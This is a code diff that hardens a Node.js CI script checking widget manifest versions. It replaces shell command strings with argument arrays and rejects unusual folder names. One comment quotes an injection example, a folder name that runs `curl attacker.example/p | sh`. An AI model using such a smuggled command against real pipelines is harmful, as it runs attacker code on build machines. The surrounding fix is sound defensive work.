@@ -6,25 +6,41 @@
 //
 // Usage: node tools/check-widget-versions.js <base-ref>   (e.g. origin/main)
 'use strict';
-const { execSync } = require('child_process');
+const { execFileSync } = require('child_process');
 
 const base = process.argv[2];
 if (!base) {
   console.error('usage: check-widget-versions.js <base-ref>');
   process.exit(2);
 }
-const sh = (cmd) => execSync(cmd, { encoding: 'utf8' });
+// execFileSync with an argument ARRAY, never execSync with a command string. Everything
+// this script feeds git is untrusted: the base ref comes from the workflow, and the
+// widget names come from paths a contributor chose. Through a shell, a directory named
+// `x; curl attacker.example/p | sh; #` executes during the pull_request job — quoting it
+// correctly is a thing you can get wrong, whereas an argv entry is never parsed at all.
+const git = (...args) => execFileSync('git', args, { encoding: 'utf8' });
 
-const mergeBase = sh(`git merge-base ${base} HEAD`).trim();
-const changed = sh(`git diff --name-only ${mergeBase} HEAD -- widgets/`)
+const mergeBase = git('merge-base', base, 'HEAD').trim();
+const changed = git('diff', '--name-only', mergeBase, 'HEAD', '--', 'widgets/')
   .split('\n').filter(Boolean);
-const widgets = [...new Set(changed.map((f) => f.split('/')[1]).filter(Boolean))];
+// A widget folder is a plain name. Anything else is not a widget this guard can reason
+// about, and is refused rather than passed along — a path that cannot be installed has
+// no business reaching git as an argument either.
+const WIDGET_DIR = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;
+const names = [...new Set(changed.map((f) => f.split('/')[1]).filter(Boolean))];
+const rejected = names.filter((w) => !WIDGET_DIR.test(w));
+if (rejected.length) {
+  console.error('Unusable widget folder name(s): ' + rejected.map((r) => JSON.stringify(r)).join(', '));
+  console.error('Widget folders must be plain names ([A-Za-z0-9._-], not starting with . or -).');
+  process.exit(1);
+}
+const widgets = names;
 
 // Existence is checked separately from parsing: a retained manifest that no longer
 // PARSES must fail the guard (seeding would ship it and Rescan would silently drop
 // the widget for every user), not masquerade as a deletion.
 const exists = (rev, p) => {
-  try { execSync(`git cat-file -e ${rev}:${p}`, { stdio: 'ignore' }); return true; }
+  try { execFileSync('git', ['cat-file', '-e', `${rev}:${p}`], { stdio: 'ignore' }); return true; }
   catch (e) { return false; }
 };
 const parseVer = (v) => {
@@ -46,13 +62,13 @@ for (const w of widgets) {
   if (!exists('HEAD', p)) continue;    // widget deleted in this PR
 
   let headManifest;
-  try { headManifest = JSON.parse(sh(`git show HEAD:${p}`)); }
+  try { headManifest = JSON.parse(git('show', `HEAD:${p}`)); }
   catch (e) { bad.push(`${w} (manifest.json no longer parses — the widget would vanish for users)`); continue; }
   const headVer = parseVer(headManifest.version);
   if (!headVer) { bad.push(`${w} (missing or invalid "version": ${JSON.stringify(headManifest.version ?? null)})`); continue; }
 
   let baseManifest = null;
-  try { baseManifest = JSON.parse(sh(`git show ${mergeBase}:${p}`)); }
+  try { baseManifest = JSON.parse(git('show', `${mergeBase}:${p}`)); }
   catch (e) { /* pre-existing corruption at base: judge the head on its own */ }
   const baseVer = baseManifest ? parseVer(baseManifest.version) : null;
   // Versions must INCREASE, not merely change — a lowered or re-used version lies
